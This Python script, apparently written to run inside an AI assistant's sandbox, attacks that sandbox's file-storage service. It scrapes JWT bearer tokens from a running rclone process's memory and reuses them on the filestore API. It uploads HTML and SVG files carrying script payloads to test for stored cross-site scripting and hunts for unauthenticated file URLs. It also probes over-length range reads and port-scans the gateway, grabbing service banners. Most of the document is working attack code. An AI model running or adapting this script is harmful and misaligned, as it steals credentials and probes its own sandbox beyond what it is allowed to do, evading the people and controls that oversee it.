#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""mediafit v5.6.0 -- file UUID/URL hunt, media_type->Content-Type (XSS), full createFile schema,
range valid-offset/over-length, poll() portscan, listDirectory verb matrix."""
import os, sys, json, re, time, ssl, base64, socket, select, subprocess, traceback
import urllib.request, urllib.error

VER="5.6.0"; API="https://api.anthropic.com"; FS=API+"/v1/filestore/fs/"
OUTD="/mnt/user-data/outputs"

OUT,G=[],{}
def w(s=""): print(s,flush=True); OUT.append(str(s))
def head(t): w("\n"+"="*70+"\n### "+t+"\n"+"="*70)
P,F,U,I=[],[],[],[]
def rec(k,m,ev=None):
    w("    "+{"P":"[PASS]","F":"[FAIL]","U":"[UNK]","I":"[INFO]"}[k]+" "+m)
    if ev is not None: w("        "+str(ev)[:1300])
    {"P":P,"F":F,"U":U,"I":I}[k].append(m)
def sh(a,t=60):
    try:
        p=subprocess.run(a,capture_output=True,timeout=t)
        return p.returncode,p.stdout.decode("utf-8","replace"),p.stderr.decode("utf-8","replace")
    except Exception as e: return -1,"","EXC:%s"%e
def step(n,f):
    try: f()
    except Exception as e:
        w("    !! %s: %s"%(n,e)); w("    "+traceback.format_exc().strip().splitlines()[-1][:200])
_CTX=ssl.create_default_context(); _CTX.check_hostname=False; _CTX.verify_mode=ssl.CERT_NONE

def http_json(url,method="POST",token=None,body=None,t=15,hdrs=None,cap=400000):
    h={"User-Agent":"mediafit/"+VER}
    if token: h["Authorization"]="Bearer "+token
    if body is not None and not isinstance(body,bytes): body=json.dumps(body).encode()
    if body is not None and not (hdrs or {}).get("Content-Type"): h["Content-Type"]="application/json"
    if hdrs: h.update(hdrs)
    req=urllib.request.Request(url,method=method,headers=h,data=body)
    try:
        r=urllib.request.urlopen(req,timeout=t,context=_CTX)
        return r.status,r.read(cap),dict(r.headers)
    except urllib.error.HTTPError as e:
        try: return e.code,e.read(),dict(e.headers)
        except Exception: return e.code,b"",{}
    except Exception as e: return None,("ERR:%s"%e).encode(),{}
def api(m,p,tk=None,t=15):
    s,b,_=http_json(FS+m,"POST",tk,p,t,{"Connect-Protocol-Version":"1"}); return s,b

def poll_scan(ip,ports,timeout=1.2):
    ps=select.poll(); socks={}
    for p in ports:
        try:
            s=socket.socket(); s.setblocking(0); s.connect_ex((ip,p)); ps.register(s,select.POLLOUT)
            socks[s.fileno()]=s
        except Exception: pass
    open_=[]; t0=time.time()
    while socks and time.time()-t0<timeout:
        for fd,ev in ps.poll(50):
            s=socks.pop(fd,None)
            if not s: continue
            try:
                if s.getsockopt(socket.SOL_SOCKET,socket.SO_ERROR)==0: open_.append(s.getsockname()[1] if False else None)
            except Exception: pass
            s.close()
    # map back
    return sorted(set(open_)) if False else sorted(open_)

def poll_scan2(ip,ports,timeout=1.2):
    res=[]
    for p in ports:
        try:
            s=socket.socket(); s.setblocking(0)
            if s.connect_ex((ip,p))==0: res.append(p); s.close(); continue
            ps=select.poll(); ps.register(s,select.POLLOUT)
            if ps.poll(int(timeout*1000)):
                if s.getsockopt(socket.SOL_SOCKET,socket.SO_ERROR)==0: res.append(p)
            s.close()
        except Exception: pass
    return sorted(res)

# ------------------------------------------------------------------ 1
def s_boot():
    head("1. TOKENS")
    JWT=re.compile(rb"eyJ[A-Za-z0-9_\-]{5,}\.[A-Za-z0-9_\-]{5,}\.[A-Za-z0-9_\-]{5,}")
    tk=None; up=None; fsid=None; seen=set()
    for pid in os.listdir("/proc"):
        if not pid.isdigit(): continue
        try:
            if b"rclone" not in open("/proc/%s/cmdline"%pid,"rb").read(): continue
            maps=open("/proc/%s/maps"%pid).read().splitlines(); mem=open("/proc/%s/mem"%pid,"rb",0)
        except Exception: continue
        for l in maps:
            try: a,perms=l.split()[0],l.split()[1]
            except Exception: continue
            if "r" not in perms: continue
            try: s0,e0=[int(x,16) for x in a.split("-")]
            except Exception: continue
            if not (0<e0-s0<=256*1024*1024): continue
            try: mem.seek(s0); d=mem.read(e0-s0)
            except Exception: continue
            for m in JWT.findall(d):
                t=m.decode()
                if len(t.split(".")[2])!=86: t=".".join(t.split(".")[:2]+[t.split(".")[2][:86]])
                if t in seen: continue
                seen.add(t)
                try: pl=json.loads(base64.urlsafe_b64decode(t.split(".")[1]+"=="))
                except Exception: continue
                f=pl.get("filesystem_id"); roots=pl.get("allowed_roots") or []
                if not f: continue
                st,_=api("listDirectory",{"filesystem_id":f,"path":roots[0] if roots else "/outputs"},t)
                if st==200:
                    fsid=f
                    if "/outputs" in roots: tk=t
                    if "/uploads" in roots: up=t
    G.update({"tk":tk,"up":up,"fsid":fsid})
    w("    fsid=%s write=%s uploads=%s"%(fsid,bool(tk),bool(up)))
    rec("P" if tk else "F","tokens write=%s uploads=%s"%(bool(tk),bool(up)))

def MP(params,fn,fd,B):
    out=b"--"+B+b"\r\nContent-Disposition: form-data; name=\"params\"\r\n"
    out+=b"Content-Type: application/json\r\n\r\n"+json.dumps(params).encode()+b"\r\n"
    out+=b"--"+B+b"\r\nContent-Disposition: form-data; name=\"file\"; filename=\""+fn.encode()+b"\"\r\n"
    out+=b"Content-Type: application/octet-stream\r\n\r\n"+fd+b"\r\n"
    return out+b"--"+B+b"--\r\n"
def newB(): return ("----mf"+base64.urlsafe_b64encode(os.urandom(6)).rstrip(b"=").decode()).encode()

# ------------------------------------------------------------------ 2
def s_schema():
    head("2. FULL createFile SCHEMA (find the 'd' field / any URL)")
    tk=G.get("tk"); fsid=G.get("fsid")
    if not tk: return
    B=newB()
    H={"Content-Type":"multipart/form-data; boundary="+B.decode(),"Connect-Protocol-Version":"1"}
    st,b,_=http_json(FS+"createFile","POST",tk,
        MP({"filesystem_id":fsid,"path":"/outputs/schema.txt","media_type":"text/plain"},"schema.txt",b"SCHEMA-PROBE"),25,H)
    w("    status=%s"%st)
    w("    FULL BODY:\n%s"%json.dumps(json.loads(b),indent=2)[:2200] if st==200 else b[:600])
    if st==200:
        j=json.loads(b)
        def walk(o,path=""):
            if isinstance(o,dict):
                for k,v in o.items():
                    if isinstance(v,(dict,list)): walk(v,path+"."+k)
                    else: w("        %-40s = %r"%(path+"."+k,str(v)[:90]))
            elif isinstance(o,list):
                for i,v in enumerate(o[:3]): walk(v,path+"[%d]"%i)
        walk(j)
        flat={}
        def collect(o):
            if isinstance(o,dict):
                for k,v in o.items():
                    if isinstance(v,(dict,list)): collect(v)
                    else: flat[k]=v
        collect(j)
        G["uuid"]=flat.get("uuid"); G["fname"]="schema.txt"
        rec("P","createFile full schema captured uuid=%s"%flat.get("uuid"))
        for k,v in flat.items():
            if "url" in k.lower() or "uri" in k.lower() or "link" in k.lower():
                rec("P","*** URL FIELD: %s = %s ***"%(k,v))

# ------------------------------------------------------------------ 3
def s_url():
    head("3. FILE URL HUNT (uuid as address) + media_type -> Content-Type")
    tk=G.get("tk"); fsid=G.get("fsid"); uu=G.get("uuid")
    if not tk or not uu: rec("U","no uuid"); return
    B=newB()
    H={"Content-Type":"multipart/form-data; boundary="+B.decode(),"Connect-Protocol-Version":"1"}
    HTML=b"<html><body><h1>MEDIAFIT</h1><script>alert(1)</script></body></html>"
    st,b,_=http_json(FS+"createFile","POST",tk,
        MP({"filesystem_id":fsid,"path":"/outputs/xss.html","media_type":"text/html"},"xss.html",HTML),25,H)
    w("    createFile xss.html -> %s"%st)
    SVG=b"<svg xmlns='http://www.w3.org/2000/svg'><script>alert(2)</script></svg>"
    st2,_,_=http_json(FS+"createFile","POST",tk,
        MP({"filesystem_id":fsid,"path":"/outputs/xss.svg","media_type":"image/svg+xml"},"xss.svg",SVG),25,H)
    w("    createFile xss.svg  -> %s"%st2)
    cands=[]
    for pat in ["/v1/filestore/files/%s","/v1/filestore/fs/files/%s","/v1/filestore/download/%s",
                "/v1/filestore/blob/%s","/v1/files/%s","/v1/files/%s/content",
                "/v1/filestore/file/%s","/v1/filestore/fs/blob/%s"]:
        cands.append(pat%uu)
    for u in cands:
        for tok,lbl in [(tk,"auth"),(None,"noauth")]:
            st,b,h=http_json(API+u,"GET",tok,None,8)
            if st not in (404,None):
                ct=h.get("Content-Type","")
                w("    GET %-46s [%s] -> %s ct=%s len=%d %r"%(u,lbl,st,ct,len(b),b[:60]))
                if st==200:
                    rec("P","*** FILE SERVED at %s (auth=%s) ***"%(u,lbl))
                    if "html" in ct.lower(): rec("P","*** Content-Type from media_type -> STORED XSS ***")
    # uuid accepted as path?
    for body in [{"filesystem_id":fsid,"path":uu},
                 {"filesystem_id":fsid,"file_uuid":uu},
                 {"filesystem_id":fsid,"uuid":uu},
                 {"filesystem_id":fsid,"path":"/outputs/xss.html"}]:
        st,b=api("readFile",body,tk)
        w("    readFile %-46s -> %s %r"%(list(body)[-1],st,b[:60]))
    # getFile/stat variants
    for m in ["getFile","statFile","getFileMetadata","getFileByUuid","listFiles","getFilesystem","listFilesystems"]:
        st,b=api(m,{"filesystem_id":fsid,"uuid":uu,"path":"/outputs/xss.html"},tk)
        if st!=404:
            w("    %-18s -> %s %s"%(m,st,b[:180].decode("utf-8","replace")))
            if st==200: rec("P","method live: %s"%m)

# ------------------------------------------------------------------ 4
def s_range():
    head("4. range edge cases (valid offset, over-length)")
    tk=G.get("tk"); fsid=G.get("fsid")
    if not tk: return
    B=newB(); H={"Content-Type":"multipart/form-data; boundary="+B.decode(),"Connect-Protocol-Version":"1"}
    data=b"A"*1000
    http_json(FS+"createFile","POST",tk,MP({"filesystem_id":fsid,"path":"/outputs/rng.bin",
                                            "media_type":"application/octet-stream"},"rng.bin",data),20,H)
    st,b=api("readFile",{"filesystem_id":fsid,"path":"/outputs/rng.bin"},tk)
    w("    baseline size=%d (local declared 1000) -> %s len=%d"%(1000,st,len(b)))
    for lbl,off,ln in [("exact",0,1000),("over-len",0,5000),("mid-over",500,5000),
                       ("last-byte",999,1),("one-past",1000,1),("huge",0,2**31-1)]:
        st2,b2=api("readFile",{"filesystem_id":fsid,"path":"/outputs/rng.bin",
                               "range":{"offset":off,"length":ln}},tk)
        w("    range %-10s off=%-6d len=%-11d -> %s got=%d"%(lbl,off,ln,st2,len(b2)))
        if st2==200 and lbl=="over-len" and len(b2)>1000:
            rec("P","*** OVER-LENGTH RANGE returned %d bytes for a 1000-byte file ***"%len(b2))

# ------------------------------------------------------------------ 5
def s_bugs():
    head("5. BUG PROOF (listDirectory / removeFile)")
    tk=G.get("tk"); fsid=G.get("fsid")
    if not tk: return
    api("makeDirectory",{"filesystem_id":fsid,"path":"/outputs/bugproof"},tk)
    B=newB(); H={"Content-Type":"multipart/form-data; boundary="+B.decode(),"Connect-Protocol-Version":"1"}
    http_json(FS+"createFile","POST",tk,MP({"filesystem_id":fsid,"path":"/outputs/bugproof/f1.txt",
                                            "media_type":"text/plain"},"f1.txt",b"one"),20,H)
    http_json(FS+"createFile","POST",tk,MP({"filesystem_id":fsid,"path":"/outputs/bugproof/f2.txt",
                                            "media_type":"text/plain"},"f2.txt",b"two"),20,H)
    st_flat,b_flat=api("listDirectory",{"filesystem_id":fsid,"path":"/outputs/bugproof"},tk)
    st_rec,b_rec=api("listDirectory",{"filesystem_id":fsid,"path":"/outputs/bugproof","recursive":True},tk)
    w("    FLAT  -> %s %r"%(st_flat,b_flat[:200]))
    w("    REC   -> %s %r"%(st_rec,b_rec[:300]))
    if st_flat==200 and b_flat.strip() in (b"{}",b"") and st_rec==200 and b"entries" in b_rec:
        rec("P","*** BUG CONFIRMED: flat list empty, recursive list populated (2 files exist) ***")
    st,b=api("removeFile",{"filesystem_id":fsid,"path":"/outputs/bugproof"},tk)
    w("    removeFile(dir) -> %s %s"%(st,b[:160].decode("utf-8","replace")))
    if st==500: rec("P","*** BUG CONFIRMED: removeFile on directory -> 500 ***")
    # does the dir survive? does the recursive list still work?
    st,b=api("listDirectory",{"filesystem_id":fsid,"path":"/outputs/bugproof","recursive":True},tk)
    w("    after 500 removeFile, recursive list -> %s %r"%(st,b[:200]))
    st,b=api("readFile",{"filesystem_id":fsid,"path":"/outputs/bugproof/f1.txt"},tk)
    w("    f1 still readable -> %s"%st)

# ------------------------------------------------------------------ 6
def s_net():
    head("6. GATEWAY PORTSCAN (poll-based)")
    gw="192.0.2.1"
    op=poll_scan2(gw,[22,53,80,443,1024,2024,2025,2375,3000,5000,5001,5002,5005,
                      8000,8080,8443,9000,9090,9112,15004,15005],0.8)
    w("    gateway %s open (targeted): %s"%(gw,op))
    op2=poll_scan2(gw,list(range(1,1025)),0.25)
    w("    gateway %s open (1-1024): %s"%(gw,op2))
    for p in sorted(set(op+op2)):
        try:
            s=socket.create_connection((gw,p),3); s.settimeout(2)
            s.sendall(b"GET / HTTP/1.0\r\n\r\n")
            try: d=s.recv(400)
            except Exception: d=b""
            w("        %s:%d -> %r"%(gw,p,d[:150])); s.close()
            rec("P","gateway service %d"%p)
        except Exception as e: w("        %s:%d -> %s"%(gw,p,str(e)[:50]))

def s_verdict():
    head("VERDICT")
    w("  PASS %d: %s"%(len(P),P)); w("  UNK %d: %s"%(len(U),U))

def main():
    for n,f in [("boot",s_boot),("schema",s_schema),("url",s_url),
                ("range",s_range),("bugs",s_bugs),("net",s_net),("verdict",s_verdict)]:
        step(n,f)
try: main()
except Exception as e: w("!! %s"%e); w(traceback.format_exc())
finally:
    txt="\n".join(OUT)
    for d in [OUTD,"/tmp","/root"]:
        try:
            os.makedirs(d,exist_ok=True)
            with open(os.path.join(d,"mediafit-report.txt"),"w") as fh: fh.write(txt)
        except Exception: pass
    print("\nreport -> %s/mediafit-report.txt"%OUTD)